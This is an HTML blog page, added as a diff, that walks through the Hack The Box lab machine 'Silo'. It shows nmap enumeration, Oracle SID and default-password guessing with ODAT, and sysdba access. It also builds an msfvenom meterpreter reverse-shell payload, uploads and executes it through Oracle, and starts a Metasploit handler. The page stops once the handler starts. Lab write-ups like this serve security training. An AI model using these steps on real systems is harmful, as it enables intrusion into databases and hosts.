@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - silo - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Silo"><a href="#Hack-The-Box-Silo" class="headerlink" title="Hack The Box - Silo"></a>Hack The Box - Silo</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially. Its IP address is <code>10.10.10.82</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/silo/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/silo)
+ |
+ |-->{SFire129}#nmap -A -v -p- 10.10.10.82
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 12:39 EDT
+ NSE: Loaded 151 scripts for scanning.
+ Not shown: 65520 closed ports
+ PORT      STATE SERVICE      VERSION
+ 80/tcp    open  http         Microsoft IIS httpd 8.5
+ | http-methods:
+ |   Supported Methods: OPTIONS TRACE GET HEAD POST
+ |_  Potentially risky methods: TRACE
+ |_http-server-header: Microsoft-IIS/8.5
+ |_http-title: IIS Windows Server
+ 135/tcp   open  msrpc        Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+ 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+ 1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
+ 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ |_http-server-header: Microsoft-HTTPAPI/2.0
+ |_http-title: Not Found
+ 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ |_http-server-header: Microsoft-HTTPAPI/2.0
+ |_http-title: Not Found
+ 49152/tcp open  msrpc        Microsoft Windows RPC
+ 49153/tcp open  msrpc        Microsoft Windows RPC
+ 49154/tcp open  msrpc        Microsoft Windows RPC
+ 49155/tcp open  msrpc        Microsoft Windows RPC
+ 49158/tcp open  msrpc        Microsoft Windows RPC
+ 49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
+ 49161/tcp open  msrpc        Microsoft Windows RPC
+ 49162/tcp open  msrpc        Microsoft Windows RPC
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ TCP/IP fingerprint:
+ OS:SCAN(V=7.80%E=4%D=6/1%OT=80%CT=1%CU=30916%PV=Y%DS=2%DC=T%G=Y%TM=5ED531C2
+ OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7
+ OS:)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54
+ OS:DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
+ OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
+ OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
+ OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
+ OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
+ OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+ OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+ OS:%T=80%CD=Z)
+ 
+ Uptime guess: 0.124 days (since Mon Jun  1 09:51:01 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=260 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+ 
+ Host script results:
+ |_clock-skew: mean: 4m04s, deviation: 0s, median: 4m04s
+ |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+ | smb-security-mode:
+ |   account_used: guest
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: supported
+ | smb2-security-mode:
+ |   2.02:
+ |_    Message signing enabled but not required
+ | smb2-time:
+ |   date: 2020-06-01T16:54:10
+ |_  start_date: 2020-06-01T13:55:27
+ 
+ TRACEROUTE (using port 3306/tcp)
+ HOP RTT       ADDRESS
+ 1   106.19 ms 10.10.14.1
+ 2   106.45 ms 10.10.10.82
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 12:50
+ Completed NSE at 12:50, 0.00s elapsed
+ Initiating NSE at 12:50
+ Completed NSE at 12:50, 0.00s elapsed
+ Initiating NSE at 12:50
+ Completed NSE at 12:50, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 623.21 seconds
+            Raw packets sent: 66518 (2.930MB) | Rcvd: 65928 (2.641MB)<br></figure></pre>
+<p>The nmap shown several open ports, specially, 1521/tcp, the service Oracle TNS Listerner (Unauthorize)
+<h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+<p>With the <a class="vglnk"https://github.com/quentinhardy/odat"rel="nofollow"><span>odat.py</span></a> <code>Oracle Database Attacking Tool</code> program, we can start to attack.
+<p>the first step, enumerate the SID with the command <code>python3 odat.py sidguesser -s 10.10.10.82 -p 1521 </code>
+<img src="/images/hackthebox/exploit/silo/1.png" alt=""></p>
+<p>We have two SID, XE and XEXDB. We need to get the user and password, then in Kali Linux locate the file <code>oracle_default_userpass.txt</code>.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/silo)
+ |
+ |-->{SFire129}#locate oracle_default_userpass.txt
+ /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt<br></figure></pre>
+ <p>Copy it into the ODAT/accounts directory.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/silo)
+ |
+ |-->{SFire129}#cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt accounts/<br></figure></pre>
+ <p> The username and passwords in this list are separated by a space instead of a forward slash (/). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in <code>vi</code> using the following command.
+ <pre><figure class="highlight plain"> :%s/ /\//g<br></figure></pre>
+ <p>Now, launch the attack <code>python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt</code>
+<img src="/images/hackthebox/exploit/silo/2.png" alt=""></p>
+<p>We have the user scott and password tigger. With the <code>sqlplus</code> can connect to enumerate the privileges.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/silo)
+ |
+ |-->{SFire129}#source /etc/profile
+ root@kali:~/HackTheBox/silo/odat# sqlplus scott/tiger@10.10.10.82:1521/XE
+  SQL*Plus: Release 19.0.0.0.0 - Production on Tue Jun 2 16:15:00 2020
+ Version 19.6.0.0.0
+ 
+ Copyright (c) 1982, 2019, Oracle.  All rights reserved.
+ 
+ Connected to:
+ Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+ 
+ SQL> select * from session_privs;
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE SESSION
+ CREATE TABLE
+ CREATE CLUSTER
+ CREATE SEQUENCE
+ CREATE PROCEDURE
+ CREATE TRIGGER
+ CREATE TYPE
+ CREATE OPERATOR
+ CREATE INDEXTYPE
+ 
+ 9 rows selected.
+ 
+ SQL> select * from user_role_privs;
+ 
+ USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+ ------------------------------ ------------------------------ --- --- ---
+ SCOTT                          CONNECT                        NO  YES NO
+ SCOTT                          RESOURCE                       NO  YES NO
+ 
+ SQL> <br></figure></pre>
+ <p>In this session no have privileges, then, run with <code>as sysbase</code> for see if the we can get admin privileges.
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privileges</h2>
+ <pre><figure class="highlight plain"> root@kali:~/HackTheBox/silo/odat# sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
+ 
+ SQL*Plus: Release 19.0.0.0.0 - Production on Tue Jun 2 16:36:04 2020
+ Version 19.6.0.0.0
+ 
+ Copyright (c) 1982, 2019, Oracle.  All rights reserved.
+ 
+ Connected to:
+ Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+ 
+ SQL> select * from session_privs;
+ 
+ PRIVILEGE
+ ----------------------------------------
+ ALTER SYSTEM
+ AUDIT SYSTEM
+ CREATE SESSION
+ ALTER SESSION
+ RESTRICTED SESSION
+ CREATE TABLESPACE
+ ALTER TABLESPACE
+ MANAGE TABLESPACE
+ DROP TABLESPACE
+ UNLIMITED TABLESPACE
+ CREATE USER
+ 
+ PRIVILEGE
+ ----------------------------------------
+ BECOME USER
+ ALTER USER
+ DROP USER
+ CREATE ROLLBACK SEGMENT
+ ALTER ROLLBACK SEGMENT
+ DROP ROLLBACK SEGMENT
+ CREATE TABLE
+ CREATE ANY TABLE
+ ALTER ANY TABLE
+ BACKUP ANY TABLE
+ DROP ANY TABLE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ LOCK ANY TABLE
+ COMMENT ANY TABLE
+ SELECT ANY TABLE
+ INSERT ANY TABLE
+ UPDATE ANY TABLE
+ DELETE ANY TABLE
+ CREATE CLUSTER
+ CREATE ANY CLUSTER
+ ALTER ANY CLUSTER
+ DROP ANY CLUSTER
+ CREATE ANY INDEX
+ 
+ PRIVILEGE
+ ----------------------------------------
+ ALTER ANY INDEX
+ DROP ANY INDEX
+ CREATE SYNONYM
+ CREATE ANY SYNONYM
+ DROP ANY SYNONYM
+ SYSDBA
+ SYSOPER
+ CREATE PUBLIC SYNONYM
+ DROP PUBLIC SYNONYM
+ CREATE VIEW
+ CREATE ANY VIEW
+ 
+ PRIVILEGE
+ ----------------------------------------
+ DROP ANY VIEW
+ CREATE SEQUENCE
+ CREATE ANY SEQUENCE
+ ALTER ANY SEQUENCE
+ DROP ANY SEQUENCE
+ SELECT ANY SEQUENCE
+ CREATE DATABASE LINK
+ CREATE PUBLIC DATABASE LINK
+ DROP PUBLIC DATABASE LINK
+ CREATE ROLE
+ DROP ANY ROLE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ GRANT ANY ROLE
+ ALTER ANY ROLE
+ AUDIT ANY
+ ALTER DATABASE
+ FORCE TRANSACTION
+ FORCE ANY TRANSACTION
+ CREATE PROCEDURE
+ CREATE ANY PROCEDURE
+ ALTER ANY PROCEDURE
+ DROP ANY PROCEDURE
+ EXECUTE ANY PROCEDURE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE TRIGGER
+ CREATE ANY TRIGGER
+ ALTER ANY TRIGGER
+ DROP ANY TRIGGER
+ CREATE PROFILE
+ ALTER PROFILE
+ DROP PROFILE
+ ALTER RESOURCE COST
+ ANALYZE ANY
+ GRANT ANY PRIVILEGE
+ CREATE MATERIALIZED VIEW
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE ANY MATERIALIZED VIEW
+ ALTER ANY MATERIALIZED VIEW
+ DROP ANY MATERIALIZED VIEW
+ CREATE ANY DIRECTORY
+ DROP ANY DIRECTORY
+ CREATE TYPE
+ CREATE ANY TYPE
+ ALTER ANY TYPE
+ DROP ANY TYPE
+ EXECUTE ANY TYPE
+ UNDER ANY TYPE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE LIBRARY
+ CREATE ANY LIBRARY
+ ALTER ANY LIBRARY
+ DROP ANY LIBRARY
+ EXECUTE ANY LIBRARY
+ CREATE OPERATOR
+ CREATE ANY OPERATOR
+ ALTER ANY OPERATOR
+ DROP ANY OPERATOR
+ EXECUTE ANY OPERATOR
+ CREATE INDEXTYPE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE ANY INDEXTYPE
+ ALTER ANY INDEXTYPE
+ DROP ANY INDEXTYPE
+ UNDER ANY VIEW
+ QUERY REWRITE
+ GLOBAL QUERY REWRITE
+ EXECUTE ANY INDEXTYPE
+ UNDER ANY TABLE
+ CREATE DIMENSION
+ CREATE ANY DIMENSION
+ ALTER ANY DIMENSION
+ 
+ PRIVILEGE
+ ----------------------------------------
+ DROP ANY DIMENSION
+ MANAGE ANY QUEUE
+ ENQUEUE ANY QUEUE
+ DEQUEUE ANY QUEUE
+ CREATE ANY CONTEXT
+ DROP ANY CONTEXT
+ CREATE ANY OUTLINE
+ ALTER ANY OUTLINE
+ DROP ANY OUTLINE
+ ADMINISTER RESOURCE MANAGER
+ ADMINISTER DATABASE TRIGGER
+ 
+ PRIVILEGE
+ ----------------------------------------
+ MERGE ANY VIEW
+ ON COMMIT REFRESH
+ EXEMPT ACCESS POLICY
+ RESUMABLE
+ SELECT ANY DICTIONARY
+ DEBUG CONNECT SESSION
+ DEBUG ANY PROCEDURE
+ FLASHBACK ANY TABLE
+ GRANT ANY OBJECT PRIVILEGE
+ CREATE EVALUATION CONTEXT
+ CREATE ANY EVALUATION CONTEXT
+ 
+ PRIVILEGE
+ ----------------------------------------
+ ALTER ANY EVALUATION CONTEXT
+ DROP ANY EVALUATION CONTEXT
+ EXECUTE ANY EVALUATION CONTEXT
+ CREATE RULE SET
+ CREATE ANY RULE SET
+ ALTER ANY RULE SET
+ DROP ANY RULE SET
+ EXECUTE ANY RULE SET
+ EXPORT FULL DATABASE
+ IMPORT FULL DATABASE
+ CREATE RULE
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE ANY RULE
+ ALTER ANY RULE
+ DROP ANY RULE
+ EXECUTE ANY RULE
+ ANALYZE ANY DICTIONARY
+ ADVISOR
+ CREATE JOB
+ CREATE ANY JOB
+ EXECUTE ANY PROGRAM
+ EXECUTE ANY CLASS
+ MANAGE SCHEDULER
+ 
+ PRIVILEGE
+ ----------------------------------------
+ SELECT ANY TRANSACTION
+ DROP ANY SQL PROFILE
+ ALTER ANY SQL PROFILE
+ ADMINISTER SQL TUNING SET
+ ADMINISTER ANY SQL TUNING SET
+ CREATE ANY SQL PROFILE
+ EXEMPT IDENTITY POLICY
+ MANAGE FILE GROUP
+ MANAGE ANY FILE GROUP
+ READ ANY FILE GROUP
+ CHANGE NOTIFICATION
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE EXTERNAL JOB
+ CREATE ANY EDITION
+ DROP ANY EDITION
+ ALTER ANY EDITION
+ CREATE ASSEMBLY
+ CREATE ANY ASSEMBLY
+ ALTER ANY ASSEMBLY
+ DROP ANY ASSEMBLY
+ EXECUTE ANY ASSEMBLY
+ EXECUTE ASSEMBLY
+ CREATE MINING MODEL
+ 
+ PRIVILEGE
+ ----------------------------------------
+ CREATE ANY MINING MODEL
+ DROP ANY MINING MODEL
+ SELECT ANY MINING MODEL
+ ALTER ANY MINING MODEL
+ COMMENT ANY MINING MODEL
+ CREATE CUBE DIMENSION
+ ALTER ANY CUBE DIMENSION
+ CREATE ANY CUBE DIMENSION
+ DELETE ANY CUBE DIMENSION
+ DROP ANY CUBE DIMENSION
+ INSERT ANY CUBE DIMENSION
+ 
+ PRIVILEGE
+ ----------------------------------------
+ SELECT ANY CUBE DIMENSION
+ CREATE CUBE
+ ALTER ANY CUBE
+ CREATE ANY CUBE
+ DROP ANY CUBE
+ SELECT ANY CUBE
+ UPDATE ANY CUBE
+ CREATE MEASURE FOLDER
+ CREATE ANY MEASURE FOLDER
+ DELETE ANY MEASURE FOLDER
+ DROP ANY MEASURE FOLDER
+ 
+ PRIVILEGE
+ ----------------------------------------
+ INSERT ANY MEASURE FOLDER
+ CREATE CUBE BUILD PROCESS
+ CREATE ANY CUBE BUILD PROCESS
+ DROP ANY CUBE BUILD PROCESS
+ UPDATE ANY CUBE BUILD PROCESS
+ UPDATE ANY CUBE DIMENSION
+ ADMINISTER SQL MANAGEMENT OBJECT
+ ALTER PUBLIC DATABASE LINK
+ ALTER DATABASE LINK
+ FLASHBACK ARCHIVE ADMINISTER
+ 
+ 208 rows selected.
+
+ SQL> select * from user_role_privs;
+ 
+ USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+ ------------------------------ ------------------------------ --- --- ---
+ SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+ SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
+ SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
+ SYS                            AQ_USER_ROLE                   YES YES NO
+ SYS                            AUTHENTICATEDUSER              YES YES NO
+ SYS                            CONNECT                        YES YES NO
+ SYS                            CTXAPP                         YES YES NO
+ SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+ SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+ SYS                            DBA                            YES YES NO
+ SYS                            DBFS_ROLE                      YES YES NO
+ 
+ USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+ ------------------------------ ------------------------------ --- --- ---
+ SYS                            DELETE_CATALOG_ROLE            YES YES NO
+ SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
+ SYS                            EXP_FULL_DATABASE              YES YES NO
+ SYS                            GATHER_SYSTEM_STATISTICS       YES YES NO
+ SYS                            HS_ADMIN_EXECUTE_ROLE          YES YES NO
+ SYS                            HS_ADMIN_ROLE                  YES YES NO
+ SYS                            HS_ADMIN_SELECT_ROLE           YES YES NO
+ SYS                            IMP_FULL_DATABASE              YES YES NO
+ SYS                            LOGSTDBY_ADMINISTRATOR         YES YES NO
+ SYS                            OEM_ADVISOR                    YES YES NO
+ SYS                            OEM_MONITOR                    YES YES NO
+ 
+ USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+ ------------------------------ ------------------------------ --- --- ---
+ SYS                            PLUSTRACE                      YES YES NO
+ SYS                            RECOVERY_CATALOG_OWNER         YES YES NO
+ SYS                            RESOURCE                       YES YES NO
+ SYS                            SCHEDULER_ADMIN                YES YES NO
+ SYS                            SELECT_CATALOG_ROLE            YES YES NO
+ SYS                            XDBADMIN                       YES YES NO
+ SYS                            XDB_SET_INVOKER                YES YES NO
+ SYS                            XDB_WEBSERVICES                YES YES NO
+ SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO
+ SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
+ 
+ 32 rows selected.
+ 
+ SQL> <br></figure></pre>
+ <p>The session shown admin privileges
+ 
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Create reverse exploit <code> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=4445 -f exe > oracle.exe</code>
+ <img src="/images/hackthebox/exploit/silo/3.png" alt=""></p>
+ <p>Upload the exploit with <code>python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ oracle.exe ~/HackTheBox/silo/oracle.exe</code>
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/silo/odat)
+ |
+ |-->{SFire129}#python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ oracle.exe ~/HackTheBox/silo/oracle.exe
+ [1] (10.10.10.82:1521): Put the /root/HackTheBox/silo/oracle.exe local file in the c:/ folder like oracle.exe on the 10.10.10.82 server
+ [+] The /root/HackTheBox/silo/oracle.exe file was created on the c:/ directory on the 10.10.10.82 server like the oracle.exe file <br></figure></pre>
+<p>Run the file uploaded <code>python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ oracle.exe</code> and run a session metasploit in multi/handler
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/silo/odat)
+ |
+ |-->{SFire129}#python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ oracle.exe
+ [1] (10.10.10.82:1521): Execute the oracle.exe command stored in the c:/ path <br></figure></pre>
+ <pre><figure class="highlight plain"> 
+ |-------(root@kali)-------|(~/HackTheBox/silo/odat)
+ |
+ |-->{SFire129}#msfconsole
+ -----------------------------------------------------------------------------------
+ The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+ may no longer be in use, so try deleting this file to see if the
+ 'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+ /opt/metasploit-framework/embedded/framework/lib/pg/deprecated_constants.rb
+ -----------------------------------------------------------------------------------
+ 
+ 
+ # cowsay++
+  ____________
+ < metasploit >
+  ------------
+        \   ,__,
+         \  (oo)____
+            (__)    )\
+               ||--|| *
+ 
+ 
+        =[ metasploit v5.0.91-dev-                         ]
+ + -- --=[ 2022 exploits - 1101 auxiliary - 343 post       ]
+ + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ + -- --=[ 7 evasion                                       ]
+ 
+ Metasploit tip: View missing module options with show missing
+ 
+ msf5 > use exploit/multi/handler
+ msf5 exploit(multi/handler) > set LHOST tun0
+ LHOST => tun0
+ msf5 exploit(multi/handler) > set LHOST tun0
+ LHOST => tun0
+ msf5 exploit(multi/handler) > set LPORT 4445
+ LPORT => 4445
+ msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+ payload => windows/x64/meterpreter/reverse_tcp
+ msf5 exploit(multi/handler) > show options
+ 
+ Module options (exploit/multi/handler):
+ 
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+ 
+ 
+ Payload options (windows/x64/meterpreter/reverse_tcp):
+ 
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST     tun0             yes       The listen address (an interface may be specified)
+    LPORT     4445             yes       The listen port
+ 
+ 
+ Exploit target:
+ 
+    Id  Name
+    --  ----
+    0   Wildcard Target
+ 
+ 
+ msf5 exploit(multi/handler) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.27:4445
